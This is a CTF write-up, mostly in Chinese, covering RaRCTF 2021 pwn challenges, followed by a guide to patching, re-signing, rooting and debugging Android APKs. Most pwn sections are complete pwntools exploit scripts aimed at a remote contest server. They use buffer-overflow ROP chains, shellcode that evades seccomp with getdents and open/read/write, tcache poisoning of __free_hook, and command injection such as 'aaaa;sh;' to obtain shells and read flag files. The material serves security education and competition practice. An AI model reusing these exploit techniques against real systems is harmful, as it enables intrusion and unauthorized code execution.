### archer

```
// file 
./archer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=390b7c841eb868d7c0490e3ecd37eaaa2d2eeea6, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/rarctf_2021/ancher/archer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



trivial，exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./archer')
r = remote('193.57.159.27', 49723)
# gdb.attach(r, """
# b *0x4012b7
# """)

r.sendlineafter('Answer [yes/no]: ', 'yes')
target = 0x404068
r.sendlineafter('Now, which soldier do you wish to shoot?\n', 'fffffffffff04068')

r.interactive()
```



### ret2winrars

```
// file
ret2winrars: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=755fcf13089e8b46f2f2f5b4c35413c92debbc58, not stripped

// checksec
[*] '/home/u1f383/rarctf_2021/ret2winRaRs/ret2winrars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



bof + return to system_plt

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('193.57.159.27', 26141)
# r = process('./ret2winrars')
# gdb.attach(r, """
# b *0x401190
# """)

_system = 0x401040
gets = 0x401060
buf = 0x404800
pop_rdi_ret = 0x000000000040124b
ret = 0x0000000000401016

r.sendline(b'A'*0x28 + p64(gets)  + p64(_system))
sleep(0.1)
r.sendline("cat gla*\x00")

r.interactive()
```



### notsimple

```
// file
notsimple: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dd0632715e2d77268c26ceeeed68d752035768aa, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/rarctf_2021/Not_That_Simple/notsimple'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

seccomp:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x09 0x00 0x40000000  if (A >= 0x40000000) goto 0013
 0004: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0013
 0005: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0013
 0006: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0013
 0007: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0013
 0008: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0013
 0009: 0x15 0x03 0x00 0x00000086  if (A == uselib) goto 0013
 0010: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0013
 0011: 0x15 0x01 0x00 0x0000003a  if (A == vfork) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```



可以 ORW ，但是不知道檔名，不過可以用 `sys_getdents` 得到檔案目錄，印出來就能知道檔名，exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('193.57.159.27', 35316)
# r = process('./notsimple')
# gdb.attach(r, """
# b *0x40128a
# """)

r.recvuntil('Oops, I\'m leaking! ')
stack = int(r.recvline()[:-1], 16)
info(f"""
stack: {hex(stack)}
""")

sc = asm(f"""
xor rax, rax
xor rdi, rdi
mov rsi, {stack}
mov rdx, 0x40000
syscall
""")

sc2 = asm(f"""
mov rax, 0
mov rdi, 0
mov rsi, {stack-0x800}
mov rdx, 0x30
syscall

mov rax, 2
mov rdi, {stack-0x800}
mov rsi, 0x10000
mov rdx, 0
syscall

mov rax, 78
mov rdi, 3
mov rsi, {stack-0x800}
mov rdx, 0x600
syscall

mov rax, 1
mov rdi, 1
mov rsi, {stack-0x800}
mov rdx, 0x600
syscall
""")

pl = sc
pl = pl.ljust(0x58, b'\x00')
pl += p64(stack)
r.sendline(pl)

pl2 = b'\x90' * 0x30
pl2 += sc2
input()
r.sendline(pl2)
input()
r.send('/pwn\x00')
r.interactive()
```



### RaRmony

```
// file
./harmony: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c6e84d3e5b89f8c8136e1c4efb655ee8f6a47281, for GNU/Linux 4.4.0, not stripped

// checksec
[*] '/home/u1f383/rarctf_2021/RaRmony/rarmony/harmony'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



這題還滿有趣的，由於 index 為 signed，因此可以讓 `fscanf()` 從 stdout 讀取資料並且印出，而 `fscanf()` 的 format 為 `%d:%[^\n]s`，並且會把 `%d` 讀到的 integer 當作 index 給 `user`，再用 `printf()` 印出，藉此可以 leak libc，但是因為 stdout 不會 return EOF，while loop 會一直執行，這時候輸入 `1.0` float 讓 `%d:%[^\n]s` 拿不到 signed integer 以及 string 即可跳出迴圈。有了 libc 就能透過修改 function pointer 成 `system()`，並且透過程式提供的 feature get shell，exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

"""
0. Read Channel    
1. View User Info  
2. Change role name
3. Change username 
"""

current_user = 0x404378
roles = 0x404360
channels = 0x404240
puts_plt = 0x401060

info(f"""
current_user: {hex(current_user)}
roles: {hex(roles)}
channels: {hex(channels)}
""")

r = remote('193.57.159.27', 61229)
# r = process('./harmony')
# gdb.attach(r, """
# b *0x401951
# b *0x4018ed
# b *0x401908
# b *0x401777
# """)

def read_chl():
    r.sendlineafter('> ', '0')

def view_user():
    r.sendlineafter('> ', '1')

def chg_role_name():
    r.sendlineafter('> ', '2')

def chg_uname():
    r.sendlineafter('> ', '3')

read_chl()
r.recvuntil('Choose channel to view')
r.sendlineafter('> ', '-4')
# sleep(0.5)
input()
r.sendline('-16:123')
libc = r.recvuntil('\x1B[0;37m:', drop=True).split(b'[0;31m#')[1]
libc = u64(b'\x00' + libc.ljust(7, b'\x00')) - 0x1ec700
_gets = libc + 0x86af0
_system = libc + 0x55410
info(f"""
libc: {hex(libc)}
gets: {hex(_gets)}
""")

r.sendline('1.0')

chg_uname()
r.sendlineafter('Enter new username: ', b'\xaa' * 0x20 + p64(_gets)[:-2])
chg_uname()
r.sendline(b"/bin/sh\x00" + p64(0) * 5 + p64(_system))
chg_uname()

sleep(0.5)
r.sendline('cat /harmony/channels/* | grep rar')

r.interactive()
```



### OOP

```
// file
oop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, with debug_info, not stripped

// checksec
[*] '/home/u1f383/rarctf_2021/OOP/OOP/oop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



這題感覺出壞了，有些地方滿硬要的，像是在修改名字的時候很明顯地有一個 bof，可以改到下一個 animal 的 data，因此透過這個方式，可以先得到足夠多的錢，而下一步他的 feature 也提供執行 `system()` 的機制，參數又是可以透過 bof 竄改到，`system()` 的參數若是  `AAA;BBB;CCC`，則即使 AAA 失敗，還是會執行 BBB 以及 CCC，不過因為 cowsay 需要接收參數，因此還是要放一個字串 (即使不存在)，最後將 animal->type 改成 `aaa;sh;` 就能 get shell，exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


animals = 0x4050f0

info(f"""
animals: {hex(animals)}
""")

r = remote('193.57.159.27', 25295)
# r = process('./oop')
# gdb.attach(r, """
# # b *Animal::SetName
# # b *0x401d73
# """)

"""
1) List Animals
2) Act on Animal
3) Buy New Animal
4) Buy translator (1000c)
"""

# get money * 1
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '1')
r.sendlineafter('What will you name your new animal? ', 'fuck')
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '2')
r.sendlineafter('What will you name your new animal? ', 'fuck')
r.sendlineafter('> ', '2')
r.sendlineafter('Which animal? ', '0')
r.sendlineafter('> ', '3')
input('1')
pl = b"\xaa"*(0x4 + 0x10) + p64(0) + p64(0x41) + p64(0x404d28) + \
    b"aaaa;sh;"[::-1] + p64(0) + p32(0x08001000)
r.sendline(pl)
r.sendlineafter('> ', '2')
r.sendlineafter('Which animal? ', '1')
r.sendlineafter('> ', '1')

# get money * 2
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '2')
r.sendlineafter('What will you name your new animal? ', 'fuck')
r.sendlineafter('> ', '2')
r.sendlineafter('Which animal? ', '0')
r.sendlineafter('> ', '3')
input('2')
pl = b"\xaa"*(0x4 + 0x10) + p64(0) + p64(0x41) + p64(0x404d28) + \
    b"aaaa;sh;"[::-1] + p64(0) + p32(0x08001000)
r.sendline(pl)
r.sendlineafter('> ', '2')
r.sendlineafter('Which animal? ', '1')
r.sendlineafter('> ', '1')

# exploit
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '2')
r.sendlineafter('What will you name your new animal? ', 'fuck')
r.sendlineafter('> ', '2')
r.sendlineafter('Which animal? ', '0')
r.sendlineafter('> ', '3')
input('3')
pl = b"\xaa"*(0x4 + 0x10) + p64(0) + p64(0x41) + p64(0x404d28) + \
    b"a bb;/bin/sh;".ljust(0x10, b'\x00') + p32(0x08001000)
r.sendline(pl)

# r.sendlineafter('> ', '4')
# r.sendlineafter('> ', '2')
# r.sendlineafter('Which animal? ', '1')
# r.sendlineafter('> ', '4')

r.interactive()
```

`rarctf{C0w_s4y_m00_p1g_s4y_01nk_fl4g_s4y-251e363a}`



### mound

```
// file
./mound: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0fa9d61b52907e22e8615b2ef7bfefc7e0fe6eb7, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/rarctf_2021/Mound/mound/mound'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

seccomp:

```
$ seccomp-tools dump ./mound     
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x0a 0x00 0x40000000  if (A >= 0x40000000) goto 0014
 0004: 0x15 0x09 0x00 0x0000003b  if (A == execve) goto 0014
 0005: 0x15 0x08 0x00 0x00000142  if (A == execveat) goto 0014
 0006: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0014
 0007: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0014
 0008: 0x15 0x05 0x00 0x00000055  if (A == creat) goto 0014
 0009: 0x15 0x04 0x00 0x00000086  if (A == uselib) goto 0014
 0010: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0014
 0011: 0x15 0x02 0x00 0x0000003a  if (A == vfork) goto 0014
 0012: 0x15 0x01 0x00 0x00000038  if (A == clone) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x06 0x00 0x00 0x00000000  return KILL
```

一樣是未知檔名 + seccomp 限制。



他自己實作了一個 heap 的機制，並且透過 chunk 內的 data 是否在類似 db 的資料結構中出現來判斷有沒有 double free，但是因為 `strlen` 那邊沒有設定好，導致可以透過前一個 chunk 修改到 freed chunk，因而有 double free 的可能。過程中有一些檢查機制，不過只需要觀察一下就能繞掉，最後可以跳到 `win()` function 做基本上任意長度的 ROP，而因為 code section 中沒有 `syscall` 還有一些有用的 `pop ; ret` instruction，因此首先要 leak libc，而後在透過 `open()` directory + `getdent` 得到檔案名稱，但是不知道為什麼 `getdent` 讀到的檔案第一個檔名會被吃掉，因此需要透過 wordlist 來 brute force 第一個檔案名稱，不過由於範圍在 0 ~ f，大概兩分鐘就猜到了，exploit:

```python
#!/usr/bin/python3

from pwn import *
import string

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

wl = "0123456789abcdef"

# r = remote('localhost', 8888)
# r = process('./mound')
# gdb.attach(r, """
# # b *top_chunk_alloc
# # b *0x401351
# # b *mcache_alloc
# """)

"""
1. Add sand
2. Add dirt
3. Replace dirt
4. Remove dirt
5. Go home
"""
exit_got = 0x404080
perror_got = 0x404070
setvbuf_got = 0x404068
exit_plt = 0x401106

def add_sand(idx, cnt):
    r.sendlineafter('> ', '1')
    r.sendafter('Pile: ', cnt)
    r.sendlineafter('Pile index: ', str(idx))

def add_dirt(sz, idx, cnt):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Size of pile: ', str(sz))
    r.sendlineafter('Pile index: ', str(idx))
    r.sendafter('Pile: ', cnt)

def replace(idx, cnt):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Pile index: ', str(idx))
    r.sendafter('New pile: ', cnt)

def delete(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter('Pile index: ', str(idx))


for w in wl:
    r = remote('193.57.159.27', 65382)
    add_sand(0, b'\xaa' * 0x100)
    add_sand(1, b'\xbb' * 0x100)
    delete(1)
    replace(0, b'\x11' * 0x100 + b'\xdd\xdd\xdd\xdd\xdd\xdd')
    delete(1)
    replace(0, b'\x22' * 0x100 + b'\xee\xee\xee\xee\xee\xee')
    delete(1)

    add_dirt(0x100, 2, p64(0xbeef0000010) + p64(0xdead0007ff8))
    add_dirt(0x100, 3, p64(0xbeef0000010) + p64(0xdead0007ff8))
    add_dirt(0x100, 4, p64(0xbeef0000010) + p64(setvbuf_got))
    add_dirt(0x20, 5, p64(0x4010f0 + 6) + p64(0x4017f7))
    r.sendline("-1")

    buf = 0x404800
    pop_rdi_ret = 0x401e8b
    pop_rsi_r15_ret = 0x401e89
    pop_rbp_ret = 0x4011f9
    read_got = 0x404048
    put_plt = 0x401030
    stderr_got = 0x404160
    leave_ret = 0x4012f7
    _csu = 0x401e82
    _csu2 = 0x401E68

    rop = flat(
        pop_rdi_ret, stderr_got,
        put_plt,

        _csu, 0, 1, 0, buf - 0x40, 0x150, read_got,
        _csu2,

        leave_ret,
        b'\xaa' * 0x30,
        pop_rbp_ret, buf - 0x8,
        leave_ret
    )

    r.recvuntil('Exploiting BOF is simple right? ;)\n')
    r.sendline(b'\xaa' * 0x40 + p64(buf - 8) + rop)
    libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ec5c0
    syscall_ret = libc + 0x66229
    pop_rdx_rbx_ret = libc + 0x162866
    pop_rsi_ret = libc + 0x27529
    pop_rax_ret = libc + 0x4a550
    mov_r10_rdx_jmp_rax = libc + 0x7b0cb
    flag = buf - 0x10
    pwn_path = buf - 0x40
    info(f"""
    libc: {hex(libc)}
    """)

    rop2 = flat(
        pop_rax_ret, 80,
        pop_rdi_ret, pwn_path,
        syscall_ret,

        pop_rdi_ret, -100,
        pop_rsi_ret, flag - 0x20,
        pop_rdx_rbx_ret, 0, 0,
        pop_rax_ret, pop_rax_ret,
        mov_r10_rdx_jmp_rax, 257,
        syscall_ret,

        # p1 -> leak file name
        # pop_rax_ret, 78,
        # pop_rdi_ret, 3,
        # pop_rsi_ret, flag - 0x200,
        # pop_rdx_rbx_ret, 0x200, 0,
        # syscall_ret,

        # p2 -> get flag
        pop_rax_ret, 0,
        pop_rdi_ret, 3,
        pop_rsi_ret, flag - 0x30,
        pop_rdx_rbx_ret, 0x40, 0,
        syscall_ret,

        pop_rax_ret, 1,
        pop_rdi_ret, 1,
        syscall_ret,
    )
    # 00200000
    # p1 -> leak file name = 016b228a42da0c8b248c9e2f801f2c6f.txt (the first chr of file disappear)
    # r.send(b"/".ljust(0x10, b'\x00') + b"/pwn".ljust(0x10, b'\x00') + rop2)
    # p2 -> get flag
    # input()
    # fn = f"//pwn/{w}16b228a42da0c8b248c9e2f801f2c6f.txt"
    fn = f"//pwn/716b228a42da0c8b248c9e2f801f2c6f.txt"
    r.send(b"/".ljust(0x10, b'\x00') + fn.encode().ljust(0x30, b'\x00') + rop2)
    
    flag = r.recv()

    if b'{' in flag:
        print(flag)
        break

    print(f"NICE TRY: {w}")
    r.close()
```



### emoji

```
// file
./emoji: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=eb5777df22780a644786b80de6091e869f0c4d14, for GNU/Linux 4.4.0, with debug_info, not stripped

// checksec
[*] '/home/u1f383/rarctf_2021/emoji/Emoji/emoji'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



可以修改到 tcache chunk fd，因此可以拿到想要 chunk，而再透過建構一個 fake chunk，就能達到 chunk overlap，並且由於 chunk size 為 0x90，因此在填滿 tcache 後能 leak libc，有了 chunk overlap + libc，就可以用 tcache poison 拿到 `__free_hook` chunk，exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = remote('193.57.159.27', 42588)
# r = process('./emoji', aslr=False)
# gdb.attach(r, """
# #   b *0x55555555535A
# """)

"""
1) Add new Emoji
2) Read Emoji
3) Delete Emoji
4) Collect Garbage
"""

def add(title, emoji, emoji2):
    r.sendlineafter('> ', '1')
    r.sendafter('Enter title: ', title)
    r.sendafter('Enter emoji: ', emoji)
    sleep(0.1)
    r.send(emoji2)

def _read(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Enter index to read: ', str(idx))

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Enter index to delete: ', str(idx))

def gc():
    r.sendlineafter('> ', '4')

### leak ###
while True:
    r = remote('193.57.159.27', 42588)
    try:
        for i in range(0x8):
            add(b"\xaa"*0x40 + p64(0) + p64(0x91), b'\xff', b'AAA')
            delete(0)
        add("/bin/sh", b'\xff', b'AAA') # 0, prevent consolidation
        gc()
        add(b"\xaa"*0x40 + p64(0) + p64(0x91), b'\xff', b'AAA\x40\xa7') # 1
        delete(1)
        gc()
        add(b"\xaa"*0x60, b'\xff', b'AAA\x40\xa7') # 1
        _read(1)
        r.recvuntil(b'\xaa'*0x60)
        libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
        __free_hook = libc + 0x1eeb28
        _system = libc + 0x55410
        info(f"""
        libc: {hex(libc)}
        """)

        ### exploit ###
        add("meow", b'\xff', b'AAA\x80\xa4') # 2
        delete(2)
        gc()
        add(b"\xbb"*0x30 + p64(0) + p64(0x21) + p64(libc + 0x1f1f90) + \
            p64(0)*2 + p64(0x91) + p64(__free_hook), b'\xff', b'AAA')
        add("meow", b'\xff', b'AAA')
        add("meow", b'\xff', b'AAA')
        add(p64(_system), b'\xff', b'AAA')
        delete(0)
        gc()
        r.interactive()
        r.close()
        break
    except KeyboardInterrupt:
        exit(1)
    except:
        print("NICE TRY")
        r.close()
```



### boring-flag-checker

```
// file
boring-flag-checker: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=69537e15e7815918c794ddc7b74ba2a57ec092a0, not stripped

// checksec
$ checksec ./boring-flag-checker 
[*] '/home/u1f383/rarctf_2021/boring/boring-flag-checker'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



這題實作了一個類似自己的 instruction set，會取 `byte % 8` 作為對應的 instruction 來執行，不過雖然指令中有 `putchar` 可以用，但是他的 docker `start.sh` 中有 `> /dev/null`，因此沒辦法透過 `putchar` 來 leak libc，最後的方法是透過改 return address 成 one gadget 來拿到 shell，因為 return address 跟 one gadget 有固定的 offset，並且他的 instruction 也可以對 return address 的位置做增減，因此並不需要 brute force。拿到 shell 之後，嘗試過直接 `> &2` (stderr) 或 `> &0` (stdin) 都沒辦法 output，不過用 `1>&0 2>&0` 的方法倒是可以將 data 導向 stdin，exploit:

```python
#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

pl = "0"*0x138
pl += "4" # for hang
pl += "0" + "7"*0xfc
pl += "0" + "7"*0xc
open('prog.bin', 'w').write(pl)

if len(sys.argv) > 1:
    r = remote('193.57.159.27', 39108)
    # r = remote('0.0.0.0', 1337)
    r.sendlineafter('enter your program: ', pl)
else:
    r = process('./boring-flag-checker', aslr=False)
    gdb.attach(r, """
    b *0x5555555555d1
    """)
    

# 0c fc <00 write>

"""
b *0x16ae + 
"""

input()
r.send(b'\x81')

input()
r.send('sh 1>&0 2>&0')
r.interactive()
```



### jammy & jojo

第一次用 android studio + IDA 動態追蹤 apk，花了滿多時間但也學到滿多的。



我當時在做題目的環境為 win10，用到的工具有:

- IDA pro 7.5 (optional)
- Android Studio / Android emulator
  - device: Pixel_3a_API_24
  - Image: Nougat, 24, x86, Android 7.0
- jar decompile online - [javadecompilers](http://www.javadecompilers.com/apk)
- apk extractor - [apktool](https://ibotpeaches.github.io/Apktool/install/)
- adb - [SDK Platform Tools](https://developer.android.com/studio/releases/platform-tools)
- sign jar - jarsigner (binary is in bin directory of your java JDK)
- trace smali code - [smalidea](https://github.com/JesusFreke/smalidea)
- root device - [supersu](https://supersuroot.org/download/)
- apk decompiler - [jadx](https://github.com/skylot/jadx)

#### Analyze / Modify apk

拿到 apk 後，可以透過 `apktool d -o <output_dir_name> <file_name>.apk` 取得 apk 內部的檔案 (其實也可以透過 unzip)，基本上目錄結構如下:

```bash
├── AndroidManifest.xml
├── apktool.yml
├── build
├── lib # 存放 .so library
├── original # metadata
├── res # 相關的靜態資源如圖檔
└── smali # apk source code
```

其中 lib 又分成四種 `arm64-v8a` (arm 64)、`armeabi-v7a` (arm 32)、x86、x86_64，而使用哪一個是由 Android emulator 使用的 image 所決定。

解開之後，可以對 smali code 做更動，而基本上由 developer 撰寫的 code 應該都會在 `smali/com/example/<package_name>` 的目錄底下，而進入點應該都是 `MainActivity.smali` 中的 `main()`:

```smali
.method private main()V
    .locals 4

    const v0, 0x7f0801a3

    .line 32
    invoke-virtual {p0, v0}, Lcom/example/jammys_old_infra_4_4/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

	...
```

在包裝修改完的程式前，如果要開啟 debug mode，要在 `AndroidManifest.xml` 的 `<application>` 中加上 `android:debuggable="true"`，大概會像是:

```xml
<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="com.example.jammys_old_infra_4_4" platformBuildVersionCode="30" platformBuildVersionName="11">
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:allowBackup="true" ... " android:debuggable="true"> <------------ here
        <activity android:name="com.example.jammys_old_infra_4_4.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

最後再用 `apktool b -f -o ./<new_apk_name>.apk <directory_name>`，這邊加上 `-f` (`--force-all`) 是因為我們對檔案有做更動。

而在打包回 apk 後，需要對 apk 做簽署，代表此 apk 是有被認證過的，而 `jarsigner` 提供一種 debug 簽署的方式，方法為: `jarsigner -verbose -signedjar <output_apk_name>.apk -keystore debug.keystore -storepass android -keypass android <apk_needed_to_sign>.apk androiddebugkey`，而 `debug.keystore` 為一個檔案，windows 的話儲存在 `C:\Users\<username>\.android\debug.keystore`，而此檔案**必須在執行任何一台 Android emulator 後才會產生**。

得到簽署後的 apk 後就可以在丟回 emulator 上執行。



#### Debug smali

在沒有 source code 的情況下，Android Studio 提供一種直接對 apk debug 的方法:

- 進入 Andriod Studio --> 左上角選單 --> Profile or Debug APK --> 選擇你的 APK
- 可以透過左上角 Menu 下方的選單來選擇 Project / Android view

這時切換到 Android view，應該可以看到 java、cpp 兩個目錄，其中 cpp 放的是 library，java 放的是 smali code，如果你已經安裝  [smalidea](https://github.com/JesusFreke/smalidea)，就可以用點擊的方式在 smali 下斷點；如果沒有安裝，可以在 repo release 中下載 smalidea plugin 的 zip 安裝包，之後:

- 左上角 File --> Settings --> Plugins --> Installed 旁的齒輪 --> Install plugin from disk --> 選擇剛剛下載的 zip

最後點擊右上角的綠色小蟲 (bug) 就可以 debug smali code，並且在下方的 debug window 的 `Variable` subwindow，點擊 `+` 並輸入 smali code 上的 variable name，就可以查看當前 variable 的 value。



#### Debug java

如果要 debug java code:

- `unzip <file_name>.apk`
- `./bin/jadx -d src classes.dex`

會得到 `src` 目錄，裡面對應著 apk 的 java code，此時將目錄丟到 Android 的 project 目錄當中，點擊任意的 smali file，上面會顯示 `Dissembled classes.dex file. To set up breakpoints for debugging, please attach Kotlin/Java source files.     Attach Kotlin/Java Sources...`，點擊右邊的 `Attach Kotlin/Java Sources...` 並選擇 `src` 目錄，之後就能在 java code 中下斷點來 debug。

不過有時候 Toolbar 不會顯示 `Attach Kotlin/Java Sources...`，不確定原因。若仍不清楚歡迎查看[官方文件](https://developer.android.com/studio/debug/apk-debugger#attach_java)。



#### Root android emulator

執行前需要先下載 SDK platform tools 取得 adb，並將資料夾加到環境變數中，讓 cmd 可以存取的到。而 root 代表著提權的 user，能存取到記憶體並對其做修改等行為，[該篇文章](https://www.trickyedecay.me/2021/03/25/how-to-get-root-access-for-avd-in-android-studio/)介紹的很好，介紹 root 的步驟也十分仔細，只需要按照他的步驟就能得到一台 root 的 device，因此在這不贅述。



#### Debug library (.so)

有時候會需要 debug app 所使用的 library，因此必須透過 adb (Android Debug Bridge) 進入 device 內部來開啟 gdbserver，並透過 remote attach 的方式來進行動態分析。在建置完 Root android emulator 的環境後，開啟 cmd 依序執行以下指令:

- `emulator -avd <device_name> -writable-system` - 以 writable 的形式開啟 emulator
- `adb forward tcp:23946 tcp:23946` - 將 device 內的 23946 port forward 到 localhost 的 23946 port
- `adb root`- 將 adbd 以 root mode 執行
- `adb shell` - 此時輸入 `id` 應該會有 (0)root 的權限
- 此時切換到裝置，執行要 debug 的 app
- `ps | grep <app_name>` - 取的 app 的 pid
- `cat /proc/<pid>/maps | grep <lib_name>.so` - 取得 library 在 app 執行過程中的 base address `base_addr`
- `gdbserver localhost:23946 --attach <pid>` - 執行 device 內建的 gdbserver，並 attach 上我們要 debug 的 app

這時候應該就能夠透過外部的 gdb 去 attach 上 `localhost:23946` 來 debug app，如果使用 IDA 來 debug 的話，可以參考以下步驟:

- 開啟對應位元的 IDA，並不打開任何檔案
- 左上角 menu --> Debugger --> Attach --> Remote GDB debugger
  - hostname: localhost
  - port: 23946

此時應該就會 attach 上去，比較麻煩的是要在開啟另一個 IDA，求得你要 debug 的 function 在 .text 當中的 offset，假設為 `0xbeef`，此時在 IDA 跳到 `base_addr + 0xbeef`，並使用 `F2` 下斷點，而在使用 `F9` 繼續執行，最後程式如果正常運作，就能在你下的斷點停下來。由於 IDA 不會主動分析 memory，因此需要自己透過 shortcut `c` (transform to code) 以及 `p` (define function) + `<tab>` 轉成 asm 以及 C/C++ -like code。



有些方式在賽後才知道，像是不使用 Android Studio 而是在 linux 上用 `anbox` 來模擬 apk 等等，也許有更好的 debug 方法或者是對於上述步驟有更好的說明。



參考資料:

- [IDA调试Android native](https://www.52pojie.cn/thread-554068-1-1.html)
- [android lib debug video](https://www.youtube.com/watch?v=3d5TsuK8Y54&ab_channel=Raslin777)
- [IDA 动态调试原生层程序 - CTF Wiki](https://ctf-wiki.org/android/basic_reverse/dynamic/ida_native_debug/#so)
- [root android emulator](https://www.trickyedecay.me/2021/03/25/how-to-get-root-access-for-avd-in-android-studio/)
